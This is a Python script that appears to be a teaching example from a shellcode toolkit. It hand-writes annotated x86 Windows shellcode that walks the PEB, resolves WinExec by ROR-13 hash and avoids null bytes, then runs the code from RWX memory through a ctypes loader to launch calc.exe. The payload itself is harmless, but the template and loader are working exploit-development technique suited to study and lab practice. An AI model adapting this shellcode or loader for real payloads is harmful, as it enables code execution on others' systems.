#!/usr/bin/env -S uv run
"""
Example 01 — WinExec("calc.exe")

Simplest complete shellcode.  Demonstrates:
  - Using ror_hash() to compute the function hash at script time
  - Using assemble() to turn ASM into bytes
  - Using check_bad_chars() to verify no null bytes slipped in
  - Running via ctypes on Windows

The ASM is written by hand so you can see every piece.
Examples 02+ show the toolkit builders that generate this automatically.

Usage:
    uv run Examples/01_calc_winexec.py          # show hex + run on Windows
    uv run Examples/01_calc_winexec.py --asm    # print annotated ASM
    uv run Examples/01_calc_winexec.py --hex    # print hex only (any OS)
"""
import argparse
import ctypes
import sys
from pathlib import Path

# ── Toolkit imports ────────────────────────────────────────────────────────────
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from Tools.shellcode_x86_win import assemble, ror_hash
from Tools.shellcode_x86_win.assembler import check_bad_chars

# ── Compute hash at import time — no magic constants ──────────────────────────
WINEXEC_HASH = ror_hash("WinExec", 13)

# ── Annotated assembly ────────────────────────────────────────────────────────
CODE = f"""\
start:
    mov   ebp, esp                   ; EBP = stack frame base
    add   esp, 0xfffff9f9            ; reserve scratch space without null bytes
                                     ; (0xfffff9f9 in LE has no 0x00 bytes)

; ── PEB walk to find kernel32.dll ─────────────────────────────────
; FS:[0x30] → PEB → PEB.Ldr → InInitializationOrderModuleList
; kernel32.dll is the 3rd entry and its name is exactly 12 chars long,
; so checking that the 13th character (index 12, unicode = byte 24) is NUL
; uniquely identifies it.
;
find_kernel32:
    xor   ecx, ecx
    mov   esi, fs:[ecx+30h]          ; ESI = &PEB
    mov   esi, [esi+0Ch]             ; ESI = PEB->Ldr
    mov   esi, [esi+1Ch]             ; ESI = Ldr.InInitializationOrderModuleList.Flink

next_module:
    mov   ebx, [esi+8h]              ; EBX = module base address
    mov   edi, [esi+20h]             ; EDI = unicode name pointer
    mov   esi, [esi]                 ; ESI = next list entry
    cmp   [edi+12*2], cx             ; is char[12] NUL?  (kernel32.dll = 12 chars)
    jne   next_module                ; not kernel32 — keep walking

; ── JMP/CALL/POP trampoline ───────────────────────────────────────
; Problem: we need the runtime address of find_function but there are
; no labels we can reference without a base address.
; Solution: CALL pushes the return address (= next instruction address)
;           onto the stack.  POP ESI captures it.  We CALL *backwards*
;           using a negative relative offset via a forward JMP first.
;
find_function_shorten:
    jmp   find_function_shorten_bnc  ; skip over find_function_ret

find_function_ret:
    pop   esi                        ; ESI = address of find_function (runtime)
    mov   [ebp+0x04], esi            ; save in EBP slot
    jmp   resolve_kernel32

find_function_shorten_bnc:
    call  find_function_ret          ; pushes &find_function; jumps back to find_function_ret

; ── Export hash resolution ────────────────────────────────────────
; On entry:  EBX = DLL base,  [esp+0x24] = target hash
;            (PUSHAD saves 8 regs × 4 bytes = 32 = 0x20; hash was pushed before
;             the call, so it sits at ESP+0x20+4 = ESP+0x24)
; On return: EAX = function VMA
;
find_function:
    pushad
    mov   eax, [ebx+0x3c]           ; e_lfanew → PE header offset
    mov   edi, [ebx+eax+0x78]       ; Export Directory Table RVA
    add   edi, ebx                   ; → VMA
    mov   ecx, [edi+0x18]           ; NumberOfNames
    mov   eax, [edi+0x20]           ; AddressOfNames RVA
    add   eax, ebx
    mov   [ebp-4], eax              ; save pointer for loop

find_function_loop:
    jecxz find_function_finished     ; ECX == 0 → not found
    dec   ecx
    mov   eax, [ebp-4]
    mov   esi, [eax+ecx*4]          ; name RVA (walking backwards)
    add   esi, ebx                   ; name VMA

compute_hash:
    xor   eax, eax
    cdq                              ; EDX = 0  (hash accumulator)
    cld                              ; forward direction for lodsb

compute_hash_again:
    lodsb                            ; AL = next byte of export name
    test  al, al
    jz    compute_hash_finished      ; NUL terminator → done
    ror   edx, 0x0d                  ; ROR 13
    add   edx, eax                   ; accumulate byte
    jmp   compute_hash_again

compute_hash_finished:
    cmp   edx, [esp+0x24]           ; does hash match requested?
    jnz   find_function_loop
    mov   edx, [edi+0x24]           ; AddressOfNameOrdinals RVA
    add   edx, ebx
    mov   cx,  [edx+2*ecx]          ; ordinal for matched name
    mov   edx, [edi+0x1c]           ; AddressOfFunctions RVA
    add   edx, ebx
    mov   eax, [edx+4*ecx]          ; function RVA
    add   eax, ebx                   ; → VMA
    mov   [esp+0x1c], eax           ; overwrite PUSHAD's saved EAX slot

find_function_finished:
    popad
    ret

; ── Resolve WinExec ───────────────────────────────────────────────
; push hash → call find_function → result in EAX → save to EBP slot
;
resolve_kernel32:
    push  {hex(WINEXEC_HASH)}                ; WinExec (ROR-13 = {hex(WINEXEC_HASH)})
    call  dword ptr [ebp+0x04]       ; find_function(EBX=kernel32)
    mov   [ebp+0x08], eax           ; save WinExec ptr

; ── Call WinExec("calc.exe", 1) ──────────────────────────────────
; "calc.exe\0" = 63 61 6c 63 2e 65 78 65 00
; Push as two dwords (right to left), null-free:
;   "exe\0" → 0x00657865 → contains null! Fix with negation trick:
;   neg(0x00657865) = 0xff9a879b which has no nulls
;   neg eax reverses it at runtime.
;
call_winexec:
    xor   eax, eax
    mov   eax, 0xff9a879b           ; neg("exe\\0") = 0x00657865
    neg   eax                        ; EAX = 0x00657865 = "exe\\0"
    push  eax                        ; push "exe\\0"
    push  0x2e636c61                 ; push "alc."  → stack: "calc.exe\\0"
    push  esp                        ; lpCmdLine = pointer to "calc.exe"
    xor   eax, eax
    inc   eax                        ; uCmdShow = SW_SHOWNORMAL (1)
    push  eax
    call  dword ptr [ebp+0x08]       ; WinExec("calc.exe", SW_SHOWNORMAL)
"""


def build() -> bytes:
    sc, count = assemble(CODE)
    sc = bytes(sc)
    hits = check_bad_chars(sc, b'\x00')
    if hits:
        print(f"[!] {len(hits)} null byte(s) in shellcode — fix encoding")
        for off, val in hits:
            print(f"    offset 0x{off:04x}: 0x{val:02x}")
    else:
        print(f"[+] {count} instructions, {len(sc)} bytes, null-free")
    return sc


def run(sc: bytes) -> None:
    buf = bytearray(sc)
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0), ctypes.c_int(len(buf)),
        ctypes.c_int(0x3000), ctypes.c_int(0x40))
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        (ctypes.c_char * len(buf)).from_buffer(buf),
        ctypes.c_int(len(buf)))
    print(f"[*] Shellcode at {hex(ptr)}")
    input("Press ENTER to execute...")
    ht = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr),
        ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--asm", action="store_true", help="Print ASM source and exit")
    ap.add_argument("--hex", action="store_true", help="Print hex only (no execute)")
    args = ap.parse_args()

    print(f"WinExec ROR-13 hash: {hex(WINEXEC_HASH)}")

    if args.asm:
        print(CODE)
        return

    try:
        sc = build()
    except SystemExit:
        print("[!] Install keystone-engine to assemble.  Use --asm to view source.")
        return

    line = '"' + "".join(f"\\x{b:02x}" for b in sc) + '"'
    print(f"Shellcode ({len(sc)} bytes):\n{line}")

    if args.hex or sys.platform != "win32":
        return

    run(sc)


if __name__ == "__main__":
    main()
